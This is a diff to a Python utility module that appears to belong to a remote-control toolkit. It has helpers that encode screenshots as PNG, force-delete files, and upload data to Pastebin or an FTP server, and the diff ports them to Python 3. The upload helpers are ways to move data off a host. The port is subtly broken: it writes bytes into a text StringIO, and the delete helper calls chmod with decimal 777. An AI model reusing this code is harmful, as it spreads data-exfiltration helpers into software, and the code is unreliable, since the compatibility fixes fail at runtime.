@@ -133,7 +133,7 @@ def ipv4(address):
     import socket
     try:
         if socket.inet_aton(str(address)):
-           return True
+            return True
     except:
         return False
 
@@ -260,7 +260,12 @@ def png(image):
     import zlib
     import numpy
     import struct
-    import StringIO
+
+    try:
+        from io import StringIO        # Python 3
+    except ImportError:
+        from StringIO import StringIO  # Python 2
+
     if isinstance(image, numpy.ndarray):
         width, height = (image.shape[1], image.shape[0])
         data = image.tobytes()
@@ -269,21 +274,26 @@ def png(image):
         data = image.rgb
     else:
         raise TypeError("invalid input type: {}".format(type(image)))
+
     line = width * 3
     png_filter = struct.pack('>B', 0)
     scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
     magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+
     ihdr = [b"", b'IHDR', b"", b""]
     ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
     ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
     ihdr[0] = struct.pack('>I', len(ihdr[2]))
+
     idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
     idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
     idat[0] = struct.pack('>I', len(idat[2]))
+
     iend = [b"", b'IEND', b"", b""]
     iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
     iend[0] = struct.pack('>I', len(iend[2]))
-    fileh = StringIO.StringIO()
+
+    fileh = StringIO()
     fileh.write(magic)
     fileh.write(b"".join(ihdr))
     fileh.write(b"".join(idat))
@@ -300,6 +310,7 @@ def delete(target):
 
     """
     import os
+    import shutil
     try:
         _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
     except OSError: pass
@@ -424,7 +435,10 @@ def pastebin(source, api_key):
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
             paste = post('https://pastebin.com/api/api_post.php', data=info)
             parts = urllib2.urlparse.urlsplit(paste)
-            return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            result = urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            if not result.endswith('/'):
+                result += '/'
+            return result
         except Exception as e:
             log("Upload to Pastebin failed with error: {}".format(e))
     else:
@@ -447,7 +461,12 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     import os
     import time
     import ftplib
-    import StringIO
+
+    try:
+        from io import StringIO        # Python 3
+    except ImportError:
+        from StringIO import StringIO  # Python 2
+
     if host and user and password:
         path  = ''
         local = time.ctime().split()
@@ -457,7 +476,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         elif hasattr(source, 'seek'):
             source.seek(0)
         else:
-            source = StringIO.StringIO(source)
+            source = StringIO(source)
         try:
             ftp = ftplib.FTP(host=host, user=user, password=password)
         except:
